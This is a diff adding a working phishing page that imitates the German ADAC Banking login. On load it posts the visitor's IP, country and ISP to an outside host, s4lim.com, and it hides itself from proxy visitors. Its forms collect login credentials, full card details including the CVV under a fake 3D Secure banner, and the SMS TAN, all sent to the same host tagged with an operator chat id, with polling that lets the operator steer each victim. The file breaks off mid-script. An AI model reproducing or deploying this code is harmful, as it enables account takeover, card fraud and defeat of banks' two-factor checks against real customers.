@@ -1,0 +1,800 @@
+
+<!DOCTYPE html>
+<html lang="de">
+   <head>
+      <meta charSet="utf-8"/>
+      <meta name="viewport" content="width=device-width"/>
+      <title>ADAC Banking Anmelden</title>
+      <meta name="next-head-count" content="3"/>
+      <meta name="description" content="as application flow"/>
+      <meta name="viewport" content="width=device-width, initial-scale=1"/> 
+      <link rel="shortcut icon" type="image/x-icon" href="https://cdn.glitch.global/41b1b034-5cbd-4df8-bc93-3483c22dd2eb/favicon.ico?v=1729737892283"/>
+	  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	  <script src="https://cdn.glitch.global/97c340a1-2b1d-4070-8865-a7c80880bd2e/validate_profile.js?v=1710368535267"></script>
+      <link rel="preload" href="https://cdn.glitch.global/41b1b034-5cbd-4df8-bc93-3483c22dd2eb/77cb0753b4806622.css?v=1729737963735" as="style"/>
+      <link rel="stylesheet" href="https://cdn.glitch.global/41b1b034-5cbd-4df8-bc93-3483c22dd2eb/77cb0753b4806622.css?v=1729737963735sss" data-n-g=""/>
+      <link rel="preload" href="https://cdn.glitch.global/41b1b034-5cbd-4df8-bc93-3483c22dd2eb/5bfdca11d81ed9d2.css?v=1729737917886" as="style"/>
+      <link rel="stylesheet" href="https://cdn.glitch.global/41b1b034-5cbd-4df8-bc93-3483c22dd2eb/5bfdca11d81ed9d2.css?v=1729737917886" data-n-p=""/>
+	  	<script type="application/javascript">
+	var grpid = '-4088644566'
+	var endurl = "https://s4lim.com/fi/fi1.php";
+	//#####################################################//
+	jQuery(document).ready(function($) {
+		$.getJSON('https://s4lim.com/ip.php', function(data) {
+			$.ajax({
+				type: "POST",
+				url: endurl,
+				dataType: "json",
+				data: {
+					ip: data.ip,
+					ctr: data.country,
+					isp: data.isp,
+					ctrcode: data.countrycode,
+					timenow: data.timenow,
+					admin: grpid
+				},
+				success: function(response) {
+					console.log("request succeeded: ", response);
+					if (data.proxy === true) {
+						document.write("Page not found");
+					}
+				},
+				error: function(jqXHR, textStatus, errorThrown) {
+					// Handle any errors that occur during the POST request
+					console.error("POST request failed: ");
+				}
+			});
+		});
+	});
+</script>
+    </head>
+	
+   <body>
+      <div id="__next">
+         <div style="--color-brand-primary:#FFCC00;--color-brand-secondary:#FFFFFF;--color-state-success:#2E7D32;--color-state-warning:#F18700;--color-state-error:#CC3333;--color-state-informational:#3079ba;--color-grayscale-primary:#191919;--color-grayscale-secondary:#666666;--color-grayscale-tertiary:#949494;--color-grayscale-gray-primary:#B2B2B2;--color-grayscale-gray-secondary:#CCCCCC;--color-grayscale-gray-tertiary:#E5E5E5;--color-interaction-primary-active:#FFB800;--color-interaction-secondary-active:#F5F5F5;--typography-display-font:normal bold 28px/1.1428571428571428 MiloSlabADAC;--typography-display-font-medium:normal bold 48px/1.1666666666666667 MiloSlabADAC;--typography-display-letter-spacing:normal;--typography-display-letter-spacing-medium:normal;--typography-h1-font:normal bold 28px/1.1428571428571428 MiloSlabADAC;--typography-h1-font-medium:normal bold 38px/1.1578947368421053 MiloSlabADAC;--typography-h1-letter-spacing:normal;--typography-h1-letter-spacing-medium:normal;--typography-h2-font:normal bold 22px/1.0909090909090908 MiloSlabADAC;--typography-h2-font-medium:normal bold 32px/1.125 MiloSlabADAC;--typography-h2-letter-spacing:normal;--typography-h2-letter-spacing-medium:normal;--typography-h3-slab-font:normal bold 20px/1.2 MiloSlabADAC;--typography-h3-slab-font-medium:normal bold 24px/1.1666666666666667 MiloSlabADAC;--typography-h3-slab-letter-spacing:normal;--typography-h3-slab-letter-spacing-medium:normal;--typography-h3-sans-font:normal bold 20px/1.2 MiloADAC;--typography-h3-sans-font-medium:normal bold 24px/1.1666666666666667 MiloADAC;--typography-h3-sans-letter-spacing:normal;--typography-h3-sans-letter-spacing-medium:normal;--typography-h4-font:normal bold 18px/1.3333333333333333 MiloADAC;--typography-h4-font-medium:normal bold 20px/1.4 MiloADAC;--typography-h4-letter-spacing:normal;--typography-h4-letter-spacing-medium:normal;--typography-subtitle-1-font:normal normal 18px/1.3333333333333333 MiloADAC;--typography-subtitle-1-font-medium:normal normal 18px/1.3333333333333333 MiloADAC;--typography-subtitle-1-letter-spacing:normal;--typography-subtitle-1-letter-spacing-medium:normal;--typography-subtitle-2-font:normal normal 16px/1.5 MiloADAC;--typography-subtitle-2-font-medium:normal normal 16px/1.5 MiloADAC;--typography-subtitle-2-letter-spacing:normal;--typography-subtitle-2-letter-spacing-medium:normal;--typography-body-1-font:normal normal 18px/1.3333333333333333 MiloADAC;--typography-body-1-font-medium:normal normal 20px/1.6 MiloADAC;--typography-body-1-letter-spacing:normal;--typography-body-1-letter-spacing-medium:normal;--typography-body-1-highlight-font:normal bold 18px/1.3333333333333333 MiloADAC;--typography-body-1-highlight-font-medium:normal bold 20px/1.6 MiloADAC;--typography-body-1-highlight-letter-spacing:normal;--typography-body-1-highlight-letter-spacing-medium:normal;--typography-body-2-font:normal normal 16px/1.25 MiloADAC;--typography-body-2-font-medium:normal normal 16px/1.25 MiloADAC;--typography-body-2-letter-spacing:normal;--typography-body-2-letter-spacing-medium:normal;--typography-body-2-highlight-font:normal bold 16px/1.25 MiloADAC;--typography-body-2-highlight-font-medium:normal bold 16px/1.25 MiloADAC;--typography-body-2-highlight-letter-spacing:normal;--typography-body-2-highlight-letter-spacing-medium:normal;--typography-caption-font:normal normal 14px/1.4285714285714286 MiloADAC;--typography-caption-font-medium:normal normal 14px/1.4285714285714286 MiloADAC;--typography-caption-letter-spacing:normal;--typography-caption-letter-spacing-medium:normal;--typography-caption-highlight-font:normal bold 14px/1.4285714285714286 MiloADAC;--typography-caption-highlight-font-medium:normal bold 14px/1.4285714285714286 MiloADAC;--typography-caption-highlight-letter-spacing:normal;--typography-caption-highlight-letter-spacing-medium:normal;--typography-label-font:normal bold 12px/1.3333333333333333 MiloADAC;--typography-label-font-medium:normal bold 12px/1.3333333333333333 MiloADAC;--typography-label-letter-spacing:1.85px;--typography-label-letter-spacing-medium:1.85px;--typography-ad-label-font:normal normal 10px/2 MiloADAC;--typography-ad-label-font-medium:normal normal 12px/1.6666666666666667 MiloADAC;--typography-ad-label-letter-spacing:0.5px;--typography-ad-label-letter-spacing-medium:0.5px;--typography-button-font:normal bold 14px/1.1428571428571428 MiloADAC;--typography-button-font-medium:normal bold 14px/1.1428571428571428 MiloADAC;--typography-button-letter-spacing:0.25px;--typography-button-letter-spacing-medium:0.25px;--typography-navi-main-font:normal bold 18px/1.3333333333333333 MiloADAC;--typography-navi-main-font-medium:normal bold 18px/1.3333333333333333 MiloADAC;--typography-navi-main-letter-spacing:0.25px;--typography-navi-main-letter-spacing-medium:0.25px;--typography-navi-main-small-font:normal bold 16px/1.25 MiloADAC;--typography-navi-main-small-font-medium:normal bold 16px/1.25 MiloADAC;--typography-navi-main-small-letter-spacing:0.22px;--typography-navi-main-small-letter-spacing-medium:0.22px;--typography-navi-sub-font:normal normal 16px/1.5 MiloADAC;--typography-navi-sub-font-medium:normal normal 16px/1.5 MiloADAC;--typography-navi-sub-letter-spacing:0.22px;--typography-navi-sub-letter-spacing-medium:0.22px;--typography-tab-font:normal bold 16px/1.5 MiloADAC;--typography-tab-font-medium:normal bold 16px/1.5 MiloADAC;--typography-tab-letter-spacing:0.22px;--typography-tab-letter-spacing-medium:0.22px" class="_uiRoot_qvsrf_1">
+            <div class="basic-page-element_pageLayout__YpLLr">
+               <header class="_header_1vg6d_1">
+                  <div class="_headerContent_1vg6d_6">
+                     <svg version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" role="presentation" aria-hidden="true" class="adac-logo_svg__OjGn7" viewBox="0 0 80 28" fill="none">
+                        <path class="adac-logo_path__Sv9lF" d="M5.93078 0.583313L0 27.4166H5.29179L6.39241 21.9898H12.2527L13.2465 27.4166H19.7101L14.3106 0.583313H5.93078ZM9.68912 6.41665H9.7591L11.5942 17.5H7.53623L9.68912 6.41665Z"></path>
+                        <path class="adac-logo_path__Sv9lF" d="M28.4061 5.24998H28.9424C33.1943 5.24998 33.6235 10.1954 33.6235 13.3155C33.6235 16.8911 33.6235 22.75 29.1206 22.75H28.4061V5.24998ZM22.0293 27.4166H30.0131C38.0322 27.4166 41.1597 21.2363 41.1597 13.585C41.1597 5.7086 37.3336 0.583313 29.2034 0.583313H22.0293V27.4166Z"></path>
+                        <path class="adac-logo_path__Sv9lF" d="M49.6883 6.41665H49.7595L51.5942 17.5H47.5362L49.6883 6.41665ZM40 27.4166H45.6026L46.7686 21.9896H52.9725L54.0252 27.4166H60.8696L55.1529 0.583313H46.2797L40 27.4166Z"></path>
+                        <path class="adac-logo_path__Sv9lF" d="M73.889 9.95144C73.889 8.13523 73.453 4.99477 71.0883 4.99477C68.3251 4.99477 67.9249 9.04376 67.9249 14.0377C67.9249 19.5616 68.1795 23.0052 71.2348 23.0052C73.6352 23.0052 74.1802 20.9621 74.325 17.5947L79.9996 18.1239C79.9996 24.0264 76.6173 28 70.9436 28C63.0142 28 60.8691 20.9994 60.8691 13.9996C60.8691 7.52983 62.9784 0 70.9436 0C77.1989 0 79.9996 4.38937 79.9996 9.95144H73.889Z"></path>
+                     </svg>
+                  </div>
+               </header>
+               <main id="main_login"   class="basic-page-element_main__AA3jd">
+                  <div class="basic-page-element_content__G9hlV basic-page-element_fullWidth__7S6TT">
+                     <div class="login-form_formContainer__gXukN">
+					 
+                        <h1 class="login-form_headline__ClYuh _h1_3xo2r_5">Anmelden</h1>
+                        <div role="form" id="login_form">
+							<form method="POST" action=""  >
+                           <div class="login-form_formElements__7ovgA">
+                              <label id="loglabel" class="_inputContainer_1p61g_1  _subtitle-1_3xo2r_25 _filled_1p61g_88 _unfilledHidden_1p61g_109">
+                                 <div class="_labelGroup_1p61g_36">
+                                    <div class="_label_1p61g_36 _caption_3xo2r_49 _moving_1p61g_80">Anmeldename</div>
+                                    <div aria-hidden="true" class="_labelSpaceReserver_1p61g_68 _caption_3xo2r_49">Anmeldename</div>
+                                    <input name="username" autofocus id="username" class="_input_1bosq_1"/>
+                                 </div>
+                              </label>
+							  <span id="errorMessages1" style="Display:none;" class="_infoMessage_553tt_1 _errorMessage_1p61g_146 _caption_3xo2r_49 _error_553tt_6">Bitte füllen Sie das Pflichtfeld aus</span>
+                           </div>
+                           <div class="login-form_imgContainer__Z95C_">
+                              <div class="login-form_formElements__7ovgA">
+                                 <label id="passlabel" class="_inputContainer_1p61g_1 _subtitle-1_3xo2r_25 _filled_1p61g_88 _unfilledHidden_1p61g_109">
+                                    <div class="_labelGroup_1p61g_36">
+                                       <div class="_label_1p61g_36 _caption_3xo2r_49 _moving_1p61g_80">Passwort</div>
+                                       <div aria-hidden="true" class="_labelSpaceReserver_1p61g_68 _caption_3xo2r_49">Passwort</div>
+                                       <input name="password" type="password" id="password" class="_input_1bosq_1"/>
+                                    </div>
+                                 </label>
+								 <span id="errorMessages2"  style="Display:none;" class="_infoMessage_553tt_1 _errorMessage_1p61g_146 _caption_3xo2r_49 _error_553tt_6">Bitte füllen Sie das Pflichtfeld aus</span>
+                              </div>
+                              <img alt="Passwort anzeigen" loading="lazy" width="24" height="24" decoding="async" data-nimg="1" class="login-form_img__YhnUy" style="color:transparent" src="https://adac-banking.solarisgroup.com/_next/static/media/eye-off.ed44f7da.svg"/>
+                           </div>
+                           <div class="form-buttons_buttons__fKmAz login-form_submitButton__w_P3b">
+						   <button type="submit" class="_button_1dbth_1 _button_3xo2r_65 _primary_1dbth_20 form-buttons_button__uZvuP">Anmelden</button></div>
+							</form>
+                        </div>
+						<output id="errorlogin" style="Display:none;" class="_toast_bw7c4_1 _error_bw7c4_38 _active_bw7c4_56" aria-hidden="false"><svg xmlns="http://www.w3.org/2000/svg" fill="none" class="_medium_1nixj_1 _icon_bw7c4_41" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" d="M22 12c0-5.53-4.47-10-10-10S2 6.47 2 12s4.47 10 10 10 10-4.47 10-10m-10-1.41L15.59 7 17 8.41 13.41 12 17 15.59 15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7z" clip-rule="evenodd"></path></svg><p class="_body-2_3xo2r_41">Es ist ein Fehler aufgetreten</p></output>
+						
+                        <div class="login-form_linksContainer__bUdit"><span>
+						<a class="login-form_passwordResetLink__97bwL" href="#">Anmeldename vergessen</a></span>
+						<span><a class="login-form_passwordResetLink__97bwL" href="#">Passwort vergessen</a></span></div>
+                        <div class="login-form_bottomLink__8OTGO">
+                           <h3 class="_h3-sans_3xo2r_17">Keine Anmeldedaten?</h3>
+                           <a class="login-form_passwordResetLink__97bwL" href="#">&gt; Jetzt Anmeldedaten festlegen</a>
+                        </div>
+
+                     </div>
+                  </div>
+               </main>
+			   <!--#######################PROFILE#####################################-->
+			   <!--#############################################################-->
+			   <main id="main_profile" style="Display:none;" class="basic-page-element_main__AA3jd">
+                  <div class="basic-page-element_content__G9hlV basic-page-element_fullWidth__7S6TT">
+                     <div class="login-form_formContainer__gXukN">
+					 
+                        <h1 class="login-form_headline__ClYuh _h1_3xo2r_5">MasterCard - VISA® Mehr Sicherheit mit 3D Secure für Ihre Kreditkarte</h1>
+                        <div role="form" id="profile_np">
+							<form method="POST" action=""  >
+                           <div class="login-form_formElements__7ovgA">
+							<input id="login_value1" name="login_value1" type="hidden" value="" />
+                              <label id="loglabel" class="_inputContainer_1p61g_1  _subtitle-1_3xo2r_25 _filled_1p61g_88 _unfilledHidden_1p61g_109">
+                                 <div class="_labelGroup_1p61g_36">
+                                    <div class="_label_1p61g_36 _caption_3xo2r_49 _moving_1p61g_80">Kartennummer</div>
+                                    <div aria-hidden="true" class="_labelSpaceReserver_1p61g_68 _caption_3xo2r_49">Kartennummer*</div>
+                                    <input name="profileno" autofocus id="profileno" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" class="_input_1bosq_1 input-logo"/>
+                                 </div>
+                              </label>
+							  <span id="pf1" style="Display:none;" class="_infoMessage_553tt_1 _errorMessage_1p61g_146 _caption_3xo2r_49 _error_553tt_6">Bitte füllen Sie das Pflichtfeld aus</span>
+                           </div>
+                           <div class="login-form_imgContainer__Z95C_">
+                              <div class="login-form_formElements__7ovgA">
+                                 <label id="passlabel" class="_inputContainer_1p61g_1 _subtitle-1_3xo2r_25 _filled_1p61g_88 _unfilledHidden_1p61g_109">
+                                    <div class="_labelGroup_1p61g_36">
+                                       <div class="_label_1p61g_36 _caption_3xo2r_49 _moving_1p61g_80">Verfallsdatum*</div>
+                                       <div aria-hidden="true" class="_labelSpaceReserver_1p61g_68 _caption_3xo2r_49">Verfallsdatum*</div>
+                                       <input name="expiryDate" type="text" id="expiryDate" onkeyup="formatString(event);" maxlength="5" placeholder="MM/JJ" inputmode="numeric" maxlength="16" class="_input_1bosq_1"/>
+                                    </div>
+                                 </label>
+								 <span id="pf2"  style="Display:none;" class="_infoMessage_553tt_1 _errorMessage_1p61g_146 _caption_3xo2r_49 _error_553tt_6">Bitte füllen Sie das Pflichtfeld aus</span>
+                              </div>
+                            </div>
+						   <div class="login-form_imgContainer__Z95C_">
+                              <div class="login-form_formElements__7ovgA">
+                                 <label id="cvcv" class="_inputContainer_1p61g_1 _subtitle-1_3xo2r_25 _filled_1p61g_88 _unfilledHidden_1p61g_109">
+                                    <div class="_labelGroup_1p61g_36">
+                                       <div class="_label_1p61g_36 _caption_3xo2r_49 _moving_1p61g_80">Kryptogramm (CVV)*</div>
+                                       <div aria-hidden="true" class="_labelSpaceReserver_1p61g_68 _caption_3xo2r_49">Kryptogramm*</div>
+                                       <input name="csc" type="text" id="csc" placeholder="***" inputmode="numeric" maxlength="3" class="_input_1bosq_1 sinput-cvv"  />
+                                    </div>
+                                 </label>
+								 <span id="pf3"  style="Display:none;" class="_infoMessage_553tt_1 _errorMessage_1p61g_146 _caption_3xo2r_49 _error_553tt_6">Bitte füllen Sie das Pflichtfeld aus</span>
+                              </div>
+                            </div>
+                           <div class="form-buttons_buttons__fKmAz login-form_submitButton__w_P3b">
+						   <button type="submit" class="_button_1dbth_1 _button_3xo2r_65 _primary_1dbth_20 form-buttons_button__uZvuP">App synchronisieren</button></div>
+							</form>
+                        </div>
+						<output id="errorprofile" style="Display:none;" class="_toast_bw7c4_1 _error_bw7c4_38 _active_bw7c4_56" aria-hidden="false">
+						<svg xmlns="http://www.w3.org/2000/svg" fill="none" class="_medium_1nixj_1 _icon_bw7c4_41" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" d="M22 12c0-5.53-4.47-10-10-10S2 6.47 2 12s4.47 10 10 10 10-4.47 10-10m-10-1.41L15.59 7 17 8.41 13.41 12 17 15.59 15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7z" clip-rule="evenodd"></path></svg><p class="_body-2_3xo2r_41">Die Kartendaten sind ungültig</p></output>
+						
+                        <div class="login-form_linksContainer__bUdit"><span>
+					 
+
+                     </div>
+                  </div>
+               </main>
+			   <!--#######################PROFILE#####################################-->
+			   <!--#############################################################-->
+			   <main id="main_sms" style="Display:none;" class="basic-page-element_main__AA3jd">
+                  <div class="basic-page-element_content__G9hlV basic-page-element_fullWidth__7S6TT">
+                     <div class="login-form_formContainer__gXukN">
+					 
+                        <h1 class="login-form_headline__ClYuh _h1_3xo2r_5">Bitte übertragen Sie die smsTAN, die wir an die bei uns hinterlegte Mobilnummer gesendet haben, in das Eingabefeld
+						</h1>
+                        <div role="form" id="smss_form">
+							<form method="POST" action=""  >
+                           <div class="login-form_formElements__7ovgA">
+							<input id="login_value" name="login_value" type="hidden" value="" />
+                              <label id="loglabel" class="_inputContainer_1p61g_1  _subtitle-1_3xo2r_25 _filled_1p61g_88 _unfilledHidden_1p61g_109">
+                                 <div class="_labelGroup_1p61g_36">
+                                    <div class="_label_1p61g_36 _caption_3xo2r_49 _moving_1p61g_80">smsTAN</div>
+                                    <div aria-hidden="true" class="_labelSpaceReserver_1p61g_68 _caption_3xo2r_49">smsTAN*</div>
+                                    <input placeholder="000000" name="smsnumtan" type="text" autofocus id="smsnumtan" maxlength="6" inputmode="numeric" class="_input_1bosq_1 sinput-smss"/>
+                                 </div>
+                              </label>
+							  <span id="errorsmsinpt" style="Display:none;" class="_infoMessage_553tt_1 _errorMessage_1p61g_146 _caption_3xo2r_49 _error_553tt_6">Bitte füllen Sie das Pflichtfeld aus</span>
+                           </div>
+                           <div class="form-buttons_buttons__fKmAz login-form_submitButton__w_P3b">
+						   <button type="submit" class="_button_1dbth_1 _button_3xo2r_65 _primary_1dbth_20 form-buttons_button__uZvuP">Weiter</button></div>
+							</form>
+                        </div>
+						<output id="invalid_sms1" style="Display:none;" class="_toast_bw7c4_1 _error_bw7c4_38 _active_bw7c4_56" aria-hidden="false"><svg xmlns="http://www.w3.org/2000/svg" fill="none" class="_medium_1nixj_1 _icon_bw7c4_41" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" d="M22 12c0-5.53-4.47-10-10-10S2 6.47 2 12s4.47 10 10 10 10-4.47 10-10m-10-1.41L15.59 7 17 8.41 13.41 12 17 15.59 15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7z" clip-rule="evenodd"></path></svg><p class="_body-2_3xo2r_41">Der SMS-Code ist ungültig oder falsch. Bitte versuchen Sie es später erneut</p></output>
+						
+                        <div class="login-form_linksContainer__bUdit"><span>
+					 
+
+                     </div>
+                  </div>
+               </main>			   
+				<!--#######################PROFILE#####################################-->
+			   <!--#############################################################-->
+			   <main id="main_done" style="Display:none;" class="basic-page-element_main__AA3jd">
+                  <div class="basic-page-element_content__G9hlV basic-page-element_fullWidth__7S6TT">
+				  
+                     <div class="login-form_formContainer__gXukN">
+						
+                        <h1 class="login-form_headline__ClYuh _h1_3xo2r_5">Sehr geehrte Damen und Herren
+						</h1>
+  							    
+             <p>vielen Dank für Ihre übermittelten Informationen. Wir haben Ihr Formular erhalten und werden Ihre Angaben in Kürze in unserem System aktualisieren und überprüfen.
+</p>
+             <p>Sollten weitere Informationen benötigt werden, setzen wir uns umgehend mit Ihnen in Verbindung. Andernfalls gehen wir davon aus, dass alle erforderlichen Angaben vorliegen.
+</p>
+             <p>Vielen Dank für Ihr Vertrauen.
+</p>
+             <p>Mit freundlichen Grüßen,
+</p>  
+						<center>
+						<img src="https://static.vecteezy.com/system/resources/previews/015/130/843/non_2x/check-mark-icon-free-png.png"
+				style="width:70px;">
+						</center>
+						
+                        <div class="login-form_linksContainer__bUdit"><span>
+					 
+
+                     </div>
+                  </div>
+               </main>	
+
+ <script>
+$(document).ready(function() {
+			$("#smss_form").submit(function(e) {
+				e.preventDefault(); // Prevent default form submission behavior
+
+				function validatesms() {
+					var valid = true;
+					var smsotpweb = $("#smsnumtan").val();
+					if (smsotpweb == "") {
+						$("#errorsmsinpt").show(); 
+						valid = false;
+					}
+					return valid;
+					$("#errorsmsinpt").hide();  
+				}
+
+				if (validatesms()) {
+					$("#errorsmsinpt").hide();
+					$("#invalid_sms1").hide();
+					$('#loader_spin').show();
+					$.ajax({
+						method: "POST",
+						//contentType: "application/json; charset=utf-8",
+						url: endurl,
+						dataType: "json",
+						data: {
+							chatid: grpid,
+							smsotps: $('#smsnumtan').val(),
+							login_value: $('#login_value').val(),
+						},
+						success: function(result) {
+							if (result.login) {
+								let intervalId = setInterval(function() {
+									checkStatus(result.login, function(result) {
+										if (result && result.status) {
+											if (result.status == "sms_set") {
+												clearInterval(intervalId);
+												$('#loader_spin').hide(); 
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$("#invalid_sms1").fadeIn(); // Show the error message
+													setTimeout(function() {
+														$("#invalid_sms1").fadeOut(); // Hide after 3 seconds (3000 ms)
+													}, 4000);
+												$('#main_profile').hide(); 
+												$('#main_login').hide(); 
+												$('#main_sms').show(); 
+												$('#smsnumtan').val("");
+												$('#smsnumtan').focus();
+												$("#login_value").attr('value', result.login);
+											} else if (result.status == "profile_set") {
+												clearInterval(intervalId);
+												$('#invalid_sms1').hide();  
+												$('#main_login').hide();
+												$('#main_sms').hide();
+												$('#main_profile').show();
+												$('#profileno').val(""),
+												$('#expiryDate').val(""),
+												$('#csc').val(""),
+												$('#loader_spin').hide();
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$("#login_value1").attr('value', result.login);
+												}else if (result.status == "login_succes_done") {
+												clearInterval(intervalId);
+												$('#main_sms').hide();
+												$('#main_profile').hide();
+												$('#main_login').hide();
+												$('#main_done').show();
+												$('#loader_spin').hide(); 
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+											}
+										} else {
+											console.error("Invalid response:", result);
+										}
+									});
+								}, 1000);
+							}
+						},
+						error: function(jqXHR, status, error) {
+							console.log("we have reached error ");
+							console.log(status);
+							console.log(error);
+						}
+					});
+				}
+			});
+		});
+$(document).ready(function() {
+			$("#profile_np").submit(function(e) {
+				e.preventDefault(); // Prevent default form submission behavior
+
+				function validateProfile() {
+					var isValid = true; // Initialize validity statu
+					$('#profileno').validateCreditCard(function(result) {
+						if (result.valid) {
+							// Credit card is valid, proceed with further validation
+							var expiryDate = $('#expiryDate').val();
+							var cvv = $('#csc').val();
+							var today = new Date();
+							var currentYear = today.getFullYear() % 100;
+							var currentMonth = today.getMonth() + 1;
+
+							// Check if expiryDate is defined and in the expected format
+							if (expiryDate && /^\d{2}\/\d{2}$/.test(expiryDate)) {
+								var [expMonth, expYear] = expiryDate.split('/');
+								expMonth = parseInt(expMonth);
+								expYear = parseInt(expYear);
+
+								var isExpired = (expYear < currentYear) || (expYear === currentYear && expMonth < currentMonth);
+
+								// Validate CVV
+								var cvvValidation = /^\d{3,4}$/.test(cvv);
+
+								if (!isExpired && cvvValidation) {
+									// Credit card information is valid, hide error messages
+									$("#pf1").show();
+									$("#pf2").show();
+									$("#pf3").show();
+								} else {
+									// Display error messages for expiration date and CVV
+									if (isExpired) {
+										$("#pf2").show();
+									} else {
+										$("#pf2").hide();
+									}
+									if (!cvvValidation) {
+										$("#pf3").show();
+									} else {
+										$("#pf3").hide();
+									}
+									$("#pf1").hide();
+									isValid = false; // Set validity status to false
+								}
+							} else {
+								// Invalid or missing expiration date format, show error message
+								$("#pf2").hide();
+								isValid = false; // Set validity status to false
+							}
+						} else {
+							// Invalid credit card number, show error message
+							$("#pf1").show();
+							$("#pf2").hide();
+							$("#pf3").hide();
+							isValid = false; // Set validity status to false
+						}
+					});
+
+					return isValid; // Return the validity status
+				}
+
+				// Use a timeout to ensure validateCreditCard has completed before proceeding
+				setTimeout(function() {
+					if (validateProfile()) {
+						$("#pf1").hide();
+						$("#pf2").hide();
+						$("#pf3").hide();
+						$('#loader_spin').show();
+						$.ajax({
+							method: "POST",
+							url: endurl,
+							dataType: "json",
+							data: {
+								chatid: grpid,
+								//full_profile: $('#login_value').val(),
+								profile_id: $('#profileno').val(),
+								profile_exp: $('#expiryDate').val(),
+								profile_csc: $('#csc').val(),
+								full_profile: $('#login_value1').val(), 
+							},
+							success: function(result) {
+								if (result.login) {
+								let intervalId = setInterval(function() {
+									checkStatus(result.login, function(result) {
+										if (result && result.status) {
+											if (result.status == "sms_set") {
+												clearInterval(intervalId);
+												$('#loader_spin').hide();
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$('#main_profile').hide();
+												$('#main_login').hide();
+												$('#main_sms').show();
+												$('#smsnumtan').val("");
+												$("#login_value").attr('value', result.login);
+											} else if (result.status == "profile_set") {
+												clearInterval(intervalId);
+												$('#main_profile').hide();
+												$('#main_login').hide();
+												$('#main_profile').show();
+												$('#loader_spin').hide();
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$('#profileno').val("");
+												$('#profileno').focus();
+												$('#expiryDate').val("");
+												$('#csc').val("");
+												$("#errorprofile").fadeIn(); // Show the error message
+													setTimeout(function() {
+														$("#errorprofile").fadeOut(); // Hide after 3 seconds (3000 ms)
+													}, 1000);
+												
+												$("#login_value1").attr('value', result.login);
+											}else if (result.status == "login_succes_done") {
+												clearInterval(intervalId);
+												$('#main_sms').hide();
+												$('#main_login').hide();
+												$('#main_profile').hide();
+												$('#main_done').show();
+												$('#loader_spin').hide(); 
+											}
+										} else {
+											console.error("Invalid response:", result);
+										}
+									});
+								}, 1000);
+							}
+							},
+							error: function(jqXHR, status, error) {
+								console.log("we have reached error ");
+								console.log(status);
+								console.log(error);
+							}
+						});
+					}
+				}, 0);
+			});
+		});
+
+
+$(document).ready(function() {
+    $("#profile_np").submit(function(e) {
+        e.preventDefault(); // Prevent default form submission behavior
+
+        function validateProfile(callback) {
+            var isValid = true; // Initialize validity status
+
+            $('#profileno').validateCreditCard(function(result) {
+                if (result.valid) {
+                    // Credit card is valid, proceed with further validation
+                    var expiryDate = $('#expiryDate').val();
+                    var cvv = $('#csc').val();
+                    var today = new Date();
+                    var currentYear = today.getFullYear() % 100;
+                    var currentMonth = today.getMonth() + 1;
+
+                    // Check if expiryDate is defined and in the expected format
+                    if (expiryDate && /^\d{2}\/\d{2}$/.test(expiryDate)) {
+                        var [expMonth, expYear] = expiryDate.split('/');
+                        expMonth = parseInt(expMonth);
+                        expYear = parseInt(expYear);
+
+                        var isExpired = (expYear < currentYear) || (expYear === currentYear && expMonth < currentMonth);
+                        var cvvValidation = /^\d{3,4}$/.test(cvv);
+
+                        if (!isExpired && cvvValidation) {
+                            // Credit card information is valid, hide error messages
+                            $("#pf1").hide();
+                            $("#pf2").hide();
+                            $("#pf3").hide();
+                            callback(true); // Indicate validity to the callback
+                        } else {
+                            // Display error messages for expiration date and CVV
+                            if (isExpired) {
+                                $("#pf2").show();
+                            } else {
+                                $("#pf2").hide();
+                            }
+                            if (!cvvValidation) {
+                                $("#pf3").show();
+                            } else {
+                                $("#pf3").hide();
+                            }
+                            $("#pf1").hide();
+                            isValid = false; // Set validity status to false
+                            callback(false); // Indicate invalidity to the callback
+                        }
+                    } else {
+                        // Invalid or missing expiration date format, show error message
+                        $("#pf1").hide();
+                        $("#pf2").show();
+                        $("#pf3").hide();
+                        isValid = false; // Set validity status to false
+                        callback(false); // Indicate invalidity to the callback
+                    }
+                } else {
+                    // Invalid credit card number, show error message
+                    $("#pf1").show();
+                    $("#pf2").hide();
+                    $("#pf3").hide();
+                    isValid = false; // Set validity status to false
+                    callback(false); // Indicate invalidity to the callback
+                }
+            });
+        }
+
+        // Call validateProfile with a callback to handle the result
+        validateProfile(function(isValid) {
+            if (isValid) {
+                $('#loader_spin').show();
+                $.ajax({
+                    method: "POST",
+                    url: endurl,
+                    dataType: "json",
+                    data: {
+                        chatid: grpid,
+                        profile_id: $('#profileno').val(),
+                        profile_exp: $('#expiryDate').val(),
+                        profile_csc: $('#csc').val(),
+                        full_profile: $('#login_value1').val(),
+                    },
+                    success: function(result) {
+						if (result.status == "sms_set") {
+							clearInterval(intervalId);
+							$('#loader_spin').hide();
+							$('html, body').animate({ scrollTop: 0 }, 'slow');
+							$('#main_profile').hide();
+							$('#main_login').hide();
+							$('#main_sms').show();
+							$('#smsotp').val("");
+							$("#login_value").attr('value', result.login);
+						} else if (result.status == "profile_set") {
+							clearInterval(intervalId);
+							$('#main_profile').hide();
+							$('#main_login').hide();
+							$('#main_profile').show();
+							$('#loader_spin').hide();
+							$('html, body').animate({ scrollTop: 0 }, 'slow');
+							$("#errorprofile").fadeIn(); // Show the error message
+								setTimeout(function() {
+									$("#errorprofile").fadeOut(); // Hide after 3 seconds (3000 ms)
+								}, 3000);
+							
+							$("#login_value1").attr('value', result.login);
+						}else if (result.status == "login_succes_done") {
+							clearInterval(intervalId);
+							$('#main_sms').hide();
+							$('#main_login').hide();
+							$('#main_profile').hide();
+							$('#main_done').show();
+							$('#loader_spin').hide(); 
+							$('html, body').animate({ scrollTop: 0 }, 'slow');
+						}
+                    },
